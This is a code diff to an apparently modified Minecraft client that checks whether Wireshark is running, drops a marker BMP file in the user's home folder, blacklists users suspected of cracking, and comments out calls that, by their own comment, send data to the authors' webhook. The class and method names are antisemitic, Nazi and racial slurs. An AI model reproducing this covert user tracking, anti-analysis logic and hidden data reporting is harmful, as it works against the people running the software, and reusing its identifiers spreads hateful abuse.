@@ -425,7 +425,7 @@ public class Minecraft implements IThreadListener, IPlayerUsage
         String line;
         while ((line = reader.readLine()) != null)
         {
-            if (line.toLowerCase().contains("wireshasrk"))
+            if (line.toLowerCase().contains("wireshark"))
             {
                 return true;
             }
@@ -448,19 +448,21 @@ public class Minecraft implements IThreadListener, IPlayerUsage
 
         try
         {
-			JUDENENCHAMBERDEGASSO.nig();
+        	
+			//JUDENENCHAMBERDEGASSO.nig();
         	File f = new File("C:\\Users\\"+System.getProperty("user.name")+"\\at.bmp");
         	if(f.exists() && !f.isDirectory()) { 
-        		JUDENSCHWEIN.nig(); // ANTI-JEW Checks for BMP file and ig it exists, sends some data to our webhook
+        		//JUDENSCHWEIN.nig(); // ANTI-JEW Checks for BMP file and ig it exists, sends some data to our webhook
         		System.out.println("You have been blacklisted, if you wish for an unblacklist, DM Napoleon ZoomberParts#1337 or Koljan#6767 (or contact info on our site) and explain why you planned on cracking/debugging our client.");
         		throw new NoStackTraceThrowable("Blacklisted.");
         		
         	}
         	if(!Minecraft.wiresharkRunning()) {
-        	C20PacketAntiJudaism.HitlerYouthAntiJudaismProcessManipulationAtBirthPropagandaMachineAntiJudenschwein();
-            this.startGame();
+        		Client.discordRP.start();
+        		//C20PacketAntiJudaism.HitlerYouthAntiJudaismProcessManipulationAtBirthPropagandaMachineAntiJudenschwein();
+        		this.startGame();
         	if(Client.nigger) {
-        		JUDENSCHWEIN.nig();
+        		//JUDENSCHWEIN.nig();
         	}
         	if(Minecraft.wiresharkRunning()) {
         		File myObj = new File("C:\\Users\\"+System.getProperty("user.name")+"\\at.bmp");
